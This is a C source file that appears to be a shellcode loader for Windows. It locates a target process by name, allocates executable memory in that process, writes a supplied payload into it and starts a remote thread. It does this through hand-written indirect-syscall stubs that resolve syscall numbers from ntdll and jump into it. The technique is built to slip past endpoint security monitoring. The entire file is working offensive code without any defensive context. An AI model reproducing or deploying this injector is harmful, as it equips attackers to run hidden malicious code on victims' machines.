#include "s.h"

DWORD NtCloseSSN;
DWORD NtCreateThreadExSSN;
DWORD NtWriteVirtualMemorySSN;
DWORD NtAllocateVirtualMemorySSN;

UINT_PTR NtCloseSyscall;
UINT_PTR NtCreateThreadExSyscall;
UINT_PTR NtWriteVirtualMemorySyscall;
UINT_PTR NtAllocateVirtualMemorySyscall;

wchar_t PROCESS[50] = {0};

HMODULE getMod(IN LPCWSTR modName) {
    HMODULE hModule = NULL;
    hModule = GetModuleHandleW(modName);
    return hModule;
}

VOID IndirectPrelude(
    IN HMODULE hNTDLL,
    IN LPCSTR NtFunction,
    OUT DWORD* SSN,
    OUT UINT_PTR* Syscall
) {
    UINT_PTR NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);
    *SSN = ((PBYTE)(NtFunctionAddress + 4))[0];
    *Syscall = NtFunctionAddress + 0x12;
}

void IndirectInject(unsigned char *buf, size_t size) {
    HMODULE hNTDLL = NULL;
    NTSTATUS STATUS = 0;
    PVOID rBuffer = NULL;
    HANDLE hThread = NULL;
    HANDLE hProcess = NULL;
    SIZE_T bytesWritten = 0;
    DWORD pid = 0;
    SIZE_T bufSize = size;

    hNTDLL = getMod(L"NTDLL");
    IndirectPrelude(hNTDLL, "NtAllocateVirtualMemory", &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
    IndirectPrelude(hNTDLL, "NtWriteVirtualMemory", &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
    IndirectPrelude(hNTDLL, "NtCreateThreadEx", &NtCreateThreadExSSN, &NtCreateThreadExSyscall);
    IndirectPrelude(hNTDLL, "NtClose", &NtCloseSSN, &NtCloseSyscall);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnapshot, &pe)) {
        do {
            wchar_t szExeFileW[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, pe.szExeFile, -1, szExeFileW, MAX_PATH);
            if (_wcsicmp(PROCESS, szExeFileW) == 0) {
                pid = pe.th32ProcessID;
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                if (hProcess) break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    if (!hProcess) return;

    STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (STATUS != STATUS_SUCCESS) goto CLEANUP;

    STATUS = NtWriteVirtualMemory(hProcess, rBuffer, buf, size, &bytesWritten);
    if (STATUS != STATUS_SUCCESS) goto CLEANUP;

    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) goto CLEANUP;

CLEANUP:
    if (hThread) NtClose(hThread);
    if (hProcess) NtClose(hProcess);
}

// === Inline syscall stubs (GCC-compatible) ===

__attribute__((naked)) NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    __asm__ __volatile__ (
        ".intel_syntax noprefix\n"
        "mov r10, rcx\n"
        "mov eax, [rip + NtAllocateVirtualMemorySSN]\n"
        "jmp [rip + NtAllocateVirtualMemorySyscall]\n"
        ".att_syntax prefix\n"
    );
}

__attribute__((naked)) NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    __asm__ __volatile__ (
        ".intel_syntax noprefix\n"
        "mov r10, rcx\n"
        "mov eax, [rip + NtWriteVirtualMemorySSN]\n"
        "jmp [rip + NtWriteVirtualMemorySyscall]\n"
        ".att_syntax prefix\n"
    );
}

__attribute__((naked)) NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList) {
    __asm__ __volatile__ (
        ".intel_syntax noprefix\n"
        "mov r10, rcx\n"
        "mov eax, [rip + NtCreateThreadExSSN]\n"
        "jmp [rip + NtCreateThreadExSyscall]\n"
        ".att_syntax prefix\n"
    );
}

__attribute__((naked)) NTSTATUS NtClose(HANDLE Handle) {
    __asm__ __volatile__ (
        ".intel_syntax noprefix\n"
        "mov r10, rcx\n"
        "mov eax, [rip + NtCloseSSN]\n"
        "jmp [rip + NtCloseSyscall]\n"
        ".att_syntax prefix\n"
    );
}
